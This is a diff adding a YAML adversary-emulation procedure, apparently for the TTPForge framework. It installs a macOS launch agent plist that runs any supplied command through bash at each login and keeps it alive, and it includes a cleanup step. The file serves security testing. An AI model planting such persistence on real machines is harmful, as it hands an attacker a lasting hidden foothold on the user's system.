@@ -1,0 +1,46 @@
+---
+name: macOS Launch Agent persistence.
+description: |
+  Simple TTP to setup and load launch agent persistence on macOS.
+args:
+  - name: cleanup
+  - name: command_or_path
+
+steps:
+  - name: launchagent
+    inline: |
+      set -e
+
+      command_or_path="{{args.command_or_path}}"
+      echo "===> Creating ~/Library/LaunchAgents if it does not already exist..."
+      mkdir -p "/Users/$(whoami)/Library/LaunchAgents"
+      echo "===> Writing plist to ~/Library/LaunchAgents/com.ttpforge.plist"
+
+      cat <<EOF > ~/Library/LaunchAgents/com.ttpforge.plist
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE plist PUBLIC "-//Apple/DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+      <plist version="1.0">
+      <dict>
+        <key>Label</key>
+        <string>com.ttpforge.plist</string>
+        <key>ProgramArguments</key>
+        <array>
+          <string>bash</string>
+          <string>-c</string>
+          <string>$command_or_path</string>
+        </array>
+        <key>KeepAlive</key>
+        <true/>
+      </dict>
+      </plist>
+      EOF
+
+      echo "===> Persistence done. ~/Library/LaunchAgents/com.ttpforge.plist dropped which executes $command_or_path. Persistence will be loaded on next reboot."
+
+    cleanup:
+      inline: |
+        set -e
+
+        if [[ "{{args.cleanup}}" == "true" ]]; then
+            rm -rf ~/Library/LaunchAgents/com.ttpforge.plist /tmp/launchagent-*
+        fi
